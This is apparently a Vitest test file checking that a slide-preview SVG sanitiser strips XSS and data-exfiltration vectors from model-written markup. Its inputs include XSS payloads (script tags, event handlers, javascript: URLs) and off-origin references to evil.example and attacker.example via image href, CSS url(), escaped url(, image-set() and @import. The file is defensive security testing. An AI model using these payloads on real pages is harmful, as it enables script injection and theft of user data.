// @vitest-environment jsdom
//
// Runs under jsdom, NOT the suite-default happy-dom: DOMPurify >=3.4.10 mishandles
// happy-dom's DOM parser (it strips benign markup while LEAVING <script>/on*
// through — the exact inversion of a sanitizer), so a happy-dom run of these
// assertions is a false negative. jsdom is DOMPurify's own reference DOM and
// matches real-browser behaviour; the real-Chromium guard is the Playwright spec
// `website/playwright/sanitize-xss.spec.ts`. See vite.config.ts for why the rest
// of the suite stays on happy-dom.
/**
 * SVG sanitising for the slide preview.
 *
 * Its own file, deliberately: `PptxMakerPage.test.tsx` mocks both
 * `pptx-maker/api` and `SlidePreview`'s default export, and importing the REAL
 * SlidePreview there to reach this named helper re-enters the hoisted api mock.
 * Testing the shipped implementation is worth a second file.
 *
 * What is at stake: the compose payload is written by a model driving the
 * presentation engine, and an SVG document can carry `<script>`, `on*` handlers
 * and `<foreignObject>` — so this is the app's XSS boundary. The two "keeps
 * markup" cases are equally load-bearing: both failure modes here render every
 * slide blank while looking secure.
 */

import { describe, it, expect } from 'vitest'

import { readFileSync } from 'node:fs'
import {
  scrubExternalRefs,
  setSvgFragment,
  urlRefsAreLocal,
} from '../apps/pptx-maker/SlidePreview'

describe('setSvgFragment', () => {
  const SVG_NS = 'http://www.w3.org/2000/svg'

  function render(fragment: string): SVGGElement {
    const group = document.createElementNS(SVG_NS, 'g')
    setSvgFragment(group, fragment)
    return group
  }

  it('strips script, event handlers, foreignObject and javascript: URLs', () => {
    // The compose payload is written by a model driving the engine, and an SVG
    // document can carry all of these. Rendering it raw would be an XSS sink on
    // the dashboard origin.
    const group = render(
      '<rect width="10" height="10" onload="alert(1)"/>' +
        '<script>alert(2)</script>' +
        '<foreignObject><body><img src=x onerror="alert(3)"></body></foreignObject>' +
        '<a xlink:href="javascript:alert(4)"><text>x</text></a>',
    )
    const html = group.innerHTML
    expect(html).not.toMatch(/<script/i)
    expect(html).not.toMatch(/onload=/i)
    expect(html).not.toMatch(/onerror=/i)
    expect(html).not.toMatch(/javascript:/i)
    expect(html).not.toMatch(/foreignObject/i)
    expect(group.querySelector('script')).toBeNull()
  })

  it('keeps legitimate drawing markup', () => {
    // Regression: sanitizing a BARE fragment (no <svg> wrapper) returns an empty
    // string, because a lone <rect> is not valid HTML body content — every slide
    // rendered blank. The wrapper in setSvgFragment is what prevents that.
    const group = render('<rect width="10" height="10"/><text>hello</text>')
    expect(group.querySelector('rect')).toBeTruthy()
    expect(group.textContent).toContain('hello')
  })

  it('produces SVG-namespaced nodes so they actually paint', () => {
    // Regression: assigning sanitized SVG source to innerHTML re-parses it in the
    // HTML namespace, yielding elements that are present in the DOM but never
    // render. RETURN_DOM_FRAGMENT preserves the namespace.
    const group = render('<circle r="5"/>')
    expect(group.firstElementChild?.namespaceURI).toBe(SVG_NS)
  })

  it('tolerates an empty fragment', () => {
    expect(render('').childNodes.length).toBe(0)
  })

  /**
   * DOMPurify's SVG profile is an XSS filter, NOT an egress filter — it keeps
   * `<image>`/`<feImage>` and their `href`, because a passive GET is not script
   * execution. But this subtree is appended to the LIVE dashboard DOM on the
   * dashboard's own origin (unlike the style boards, which render in a
   * null-origin sandboxed frame), and the dashboard CSP allows `img-src … https:`
   * — so there is no backstop. Slide text is whatever the user asked the deck to
   * say, so one off-origin reference exfiltrates it in a query string.
   */
  describe('off-origin URL references', () => {
    const SECRET = 'https://evil.example/?d=secret'

    /** Every attribute value anywhere in the subtree, for leak assertions. */
    function allAttrValues(group: SVGGElement): string {
      return Array.from(group.querySelectorAll('*'))
        .flatMap((el) => Array.from(el.attributes).map((a) => `${a.name}=${a.value}`))
        .join(' ')
    }

    it('neutralizes an off-origin <image href>', () => {
      const group = render(`<image href="${SECRET}" width="10" height="10"/>`)
      expect(allAttrValues(group)).not.toContain('evil.example')
      expect(group.querySelector('image')?.getAttribute('href')).toBeNull()
    })

    it('neutralizes the xlink:href variant', () => {
      const group = render(`<image xlink:href="${SECRET}" width="10" height="10"/>`)
      expect(allAttrValues(group)).not.toContain('evil.example')
    })

    it('neutralizes a protocol-relative reference', () => {
      // `//evil.example/x` inherits the page scheme, so it is a live cross-origin
      // fetch while containing no scheme for a naive `https?:` scan to match.
      const group = render('<image href="//evil.example/x" width="10" height="10"/>')
      expect(allAttrValues(group)).not.toContain('evil.example')
    })

    it('neutralizes a scheme-relative and a root-relative reference', () => {
      const group = render(
        '<image href="https:/evil.example/a" width="1" height="1"/>' +
          '<image xlink:href="/absolute/path.png" width="1" height="1"/>',
      )
      const values = allAttrValues(group)
      expect(values).not.toContain('evil.example')
      expect(values).not.toContain('/absolute/path.png')
    })

    it('neutralizes url() in a style attribute, keeping the rest of the style', () => {
      const group = render(
        `<rect style="stroke:red;fill:url(${SECRET});opacity:0.5" width="10" height="10"/>`,
      )
      const rect = group.querySelector('rect')
      expect(allAttrValues(group)).not.toContain('evil.example')
      // Over-sanitizing would blank the slide, so the innocent declarations stay.
      expect(rect?.getAttribute('style')).toContain('stroke')
      expect(rect?.getAttribute('style')).toContain('opacity')
    })

    it('neutralizes an off-origin <feImage href>', () => {
      // The svgFilters profile is enabled, so feImage is a live fetch primitive.
      const group = render(`<filter id="f"><feImage href="${SECRET}"/></filter>`)
      expect(allAttrValues(group)).not.toContain('evil.example')
    })

    it('neutralizes every FuncIRI presentation attribute', () => {
      const group = render(
        '<rect fill="url(https://evil.example/f)" stroke="url(//evil.example/s)"' +
          ' clip-path="url(https://evil.example/c)" mask="url(https://evil.example/m)"' +
          ' filter="url(https://evil.example/fi)" marker-start="url(https://evil.example/ms)"' +
          ' marker-mid="url(https://evil.example/mm)" marker-end="url(https://evil.example/me)"' +
          ' width="10" height="10"/>',
      )
      expect(allAttrValues(group)).not.toContain('evil.example')
    })

    it('neutralizes references on gradients, patterns, textPath and tref', () => {
      // Everything the SVG profile keeps that resolves a URL — enumerated so a
      // vector we did not hand-list still has to fail closed.
      const group = render(
        `<pattern id="p" href="${SECRET}"><rect width="1" height="1"/></pattern>` +
          `<linearGradient id="g" href="${SECRET}"><stop offset="0"/></linearGradient>` +
          `<radialGradient id="r" xlink:href="${SECRET}"><stop offset="0"/></radialGradient>` +
          `<text><textPath href="${SECRET}">hi</textPath></text>` +
          `<tref xlink:href="${SECRET}"/><mpath xlink:href="${SECRET}"/>` +
          `<a href="${SECRET}"><text>x</text></a>`,
      )
      expect(allAttrValues(group)).not.toContain('evil.example')
    })

    it('drops an inline <style> element, which can fetch with no url( token', () => {
      // `@import` and `@font-face src` both fetch, and neither is visible to a
      // `url(` scan — so the element goes rather than being partially cleaned.
      //
      // Built node-by-node deliberately: DOMPurify's SVG profile ALLOWS `style`
      // as a tag (verified against dompurify 3.3.3), so a real browser hands this
      // element to the scrub walk — but the test DOM's HTML parser discards
      // `svg > style` and every sibling after it when parsing a string, which
      // would make a string-driven version of this test pass with the fix
      // reverted. Driving the walk directly is what makes it a real control.
      const root = document.createElementNS(SVG_NS, 'svg')
      const style = document.createElementNS(SVG_NS, 'style')
      style.textContent = '@import "https://evil.example/i";'
      root.appendChild(style)
      const rect = document.createElementNS(SVG_NS, 'rect')
      rect.setAttribute('width', '10')
      root.appendChild(rect)

      scrubExternalRefs(root)

      expect(root.querySelector('style')).toBeNull()
      expect(root.textContent).not.toContain('evil.example')
      // The sibling drawing markup must survive — dropping the stylesheet is not
      // licence to drop the slide.
      expect(root.querySelector('rect')).toBeTruthy()
    })

    it('neutralizes a CSS-escaped url( that no raw-text scan would see', () => {
      // CSS resolves escapes while tokenising, so `\75 rl(...)` IS `url(...)`.
      const group = render(
        '<rect style="fill:\\75 rl(https://evil.example/x)" width="10" height="10"/>',
      )
      expect(allAttrValues(group)).not.toContain('evil.example')
    })

    it('neutralizes a malformed url( that never closes', () => {
      const group = render('<rect fill="url(https://evil.example/x" width="10" height="10"/>')
      expect(allAttrValues(group)).not.toContain('evil.example')
    })

    /**
     * The false-negative guards. Over-sanitizing renders every slide wrong while
     * looking secure, so these matter as much as the cases above: the deck's
     * shared gradients and symbols live in a SEPARATE `defs` payload and every
     * slide reaches them by id.
     */
    it('keeps same-document fragment references intact', () => {
      const group = render(
        '<rect fill="url(#grad)" clip-path="url(#clip)" filter="url(#blur)"' +
          ' width="10" height="10"/>' +
          '<symbol id="realSymbol"><circle r="5"/></symbol>' +
          '<linearGradient id="g2" href="#grad"><stop offset="0"/></linearGradient>' +
          '<text><textPath href="#curve">hi</textPath></text>',
      )
      const rect = group.querySelector('rect')
      expect(rect?.getAttribute('fill')).toBe('url(#grad)')
      expect(rect?.getAttribute('clip-path')).toBe('url(#clip)')
      expect(rect?.getAttribute('filter')).toBe('url(#blur)')
      expect(group.querySelector('symbol')?.getAttribute('id')).toBe('realSymbol')
      expect(group.querySelector('linearGradient')?.getAttribute('href')).toBe('#grad')
      expect(group.querySelector('textPath')?.getAttribute('href')).toBe('#curve')
    })

    it('keeps a fragment url() in a style attribute', () => {
      const group = render('<rect style="fill:url(#grad);stroke:red" width="10" height="10"/>')
      const style = group.querySelector('rect')?.getAttribute('style') ?? ''
      expect(style).toContain('#grad')
      expect(style).toContain('stroke')
    })

    it('keeps a fragment <feImage href> so filter chains still compose', () => {
      const group = render('<filter id="f"><feImage href="#source"/></filter>')
      expect(group.querySelector('feImage')?.getAttribute('href')).toBe('#source')
    })

    it('keeps inline data: bitmaps on <image>, which is how the engine ships art', () => {
      // The engine's compose step re-encodes every embedded raster as
      // `data:image/webp;base64,...`. Rejecting data: would blank every photo.
      const webp = 'data:image/webp;base64,AAAA'
      const group = render(`<image href="${webp}" width="10" height="10"/>`)
      expect(group.querySelector('image')?.getAttribute('href')).toBe(webp)
    })

    it('drops data: on elements other than <image>, and svg+xml everywhere', () => {
      // A data URL issues no request, but only a bitmap on <image> is legitimate;
      // image/svg+xml is a document, not a bitmap, and the engine never emits it.
      const group = render(
        '<image href="data:image/svg+xml,%3Csvg%3E%3C/svg%3E" width="1" height="1"/>' +
          '<filter id="f"><feImage href="data:image/webp;base64,AAAA"/></filter>',
      )
      expect(group.querySelector('image')?.getAttribute('href')).toBeNull()
      expect(group.querySelector('feImage')?.getAttribute('href')).toBeNull()
    })

    it('scrubs nested elements, not just the fragment root', () => {
      const group = render(
        `<g><g><g><image href="${SECRET}" width="1" height="1"/>` +
          '<rect fill="url(#keepMe)" width="1" height="1"/></g></g></g>',
      )
      expect(allAttrValues(group)).not.toContain('evil.example')
      expect(group.querySelector('rect')?.getAttribute('fill')).toBe('url(#keepMe)')
    })
  })
})


/**
 * `bgFill` is set DIRECTLY on a `<rect>`, outside `scrubExternalRefs`'s walk — which
 * is exactly how it slipped past the rest of the SVG hardening. A `fill` accepts a
 * FuncIRI, so an off-origin `url(…)` there is a live GET carrying deck data away.
 */
// Read from the repo path rather than `import.meta.url`: under vitest's transform
// that is not a file: URL, so `new URL(...)` throws at collection time.
const SlidePreviewSource = readFileSync(
  'src/apps/pptx-maker/SlidePreview.tsx',
  'utf-8',
)

describe('bgFill URL guard', () => {
  it('rejects an off-origin url()', () => {
    expect(urlRefsAreLocal('url(https://attacker.example/?d=deck)')).toBe(false)
    expect(urlRefsAreLocal('url(//attacker.example/x)')).toBe(false)
    expect(urlRefsAreLocal("url('https://attacker.example/y')")).toBe(false)
  })

  it('accepts a plain colour and a same-document gradient', () => {
    // The false-negative guards: a deck's background is normally either a literal
    // colour or a gradient defined in the shared `defs` payload.
    expect(urlRefsAreLocal('#1f2430')).toBe(true)
    expect(urlRefsAreLocal('rgb(31 36 48)')).toBe(true)
    expect(urlRefsAreLocal('url(#brandGradient)')).toBe(true)
    expect(urlRefsAreLocal('transparent')).toBe(true)
  })

  it('treats an unparseable url( as hostile', () => {
    expect(urlRefsAreLocal('url(https://attacker.example')).toBe(false)
  })

  it('rejects a CSS-ESCAPED url(, which no raw scan can see', () => {
    // CSS resolves escapes while tokenising, so `u\72l(…)` is a live `url(`. The
    // opener regex finds nothing in the raw text, so the early "no openers, it's
    // clean" return accepted it and the browser then issued the off-origin GET.
    //
    // `scrubStyleAttribute` already retired an escaped `style` attribute — which is
    // why this was easy to miss: `style` was covered while every PRESENTATION
    // attribute (`fill`, `stroke`, `filter`, `clip-path`, `mask`) came straight to
    // this helper and was not.
    expect(urlRefsAreLocal('u\\72l(https://attacker.example/x)')).toBe(false)
    expect(urlRefsAreLocal('\\75 rl(https://attacker.example/x)')).toBe(false)
    // Escaped and otherwise-innocent still goes: a real presentation value has no
    // reason to carry an escape, and guessing which escapes are benign is the
    // losing side of this trade.
    expect(urlRefsAreLocal('\\23 1f2430')).toBe(false)
  })

  it('an escaped fill is stripped from a fragment, end to end', () => {
    // The helper rule applied through the walk that actually renders.
    const host = document.createElementNS('http://www.w3.org/2000/svg', 'svg')
    setSvgFragment(host, '<rect fill="u\\72l(https://attacker.example/?d=deck)"/>')
    const rect = host.querySelector('rect')
    expect(rect).not.toBeNull()
    expect(rect!.getAttribute('fill')).toBeNull()
  })

  it('the bgFill CALL SITE applies the guard, not just the helper', () => {
    // Testing `urlRefsAreLocal` alone passes even with the call site reverted — it
    // proves the rule exists, not that the rect uses it. This asserts on the source
    // of the one write that bypasses `scrubExternalRefs`, which is the actual defect.
    const src = SlidePreviewSource
    const call = src.match(/rect\.setAttribute\([\s\S]{0,200}?'fill'[\s\S]{0,200}?\n\s*\)/)
    expect(call, "no rect fill assignment found — did the code move?").toBeTruthy()
    expect(call![0]).toContain('urlRefsAreLocal')
    expect(call![0]).toContain('transparent')
  })
})

describe('fetch-capable CSS functions other than url()', () => {
  // `url()` is not the only way a declaration reaches the network, so a scan that
  // knows only that token is a denylist with holes: `image-set()` and `src()` take
  // a bare URL STRING, so there is no `url(` for the opener scan to find and the
  // "no openers, it's clean" early return accepted them.

  it('rejects image-set() and its vendor spellings', () => {
    expect(urlRefsAreLocal("image-set('https://attacker.example/?d=Q1' 1x)")).toBe(false)
    expect(urlRefsAreLocal("-webkit-image-set('https://attacker.example/x' 1x)")).toBe(false)
  })

  it('rejects src() and image()', () => {
    expect(urlRefsAreLocal("src('https://attacker.example/f.woff2')")).toBe(false)
    expect(urlRefsAreLocal("image('https://attacker.example/x.png')")).toBe(false)
  })

  it('rejects @import, which fetches a whole stylesheet', () => {
    expect(urlRefsAreLocal("@import 'https://attacker.example/x.css'")).toBe(false)
  })

  it('does not flag a value that merely CONTAINS the word', () => {
    // Matched as a function token (name + `(`), so ordinary copy and class names
    // are unaffected — over-refusing here would blank legitimate slides.
    expect(urlRefsAreLocal('my-image-source')).toBe(true)
    expect(urlRefsAreLocal('#1f2430')).toBe(true)
    expect(urlRefsAreLocal('url(#brandGradient)')).toBe(true)
  })

  it('strips a fetching function from a style attribute, end to end', () => {
    const host = document.createElementNS('http://www.w3.org/2000/svg', 'svg')
    setSvgFragment(
      host,
      '<rect style="mask-image:image-set(\'https://attacker.example/?d=deck\' 1x)"/>',
    )
    const rect = host.querySelector('rect')
    expect(rect).not.toBeNull()
    expect(rect!.getAttribute('style') ?? '').not.toContain('attacker.example')
  })
})
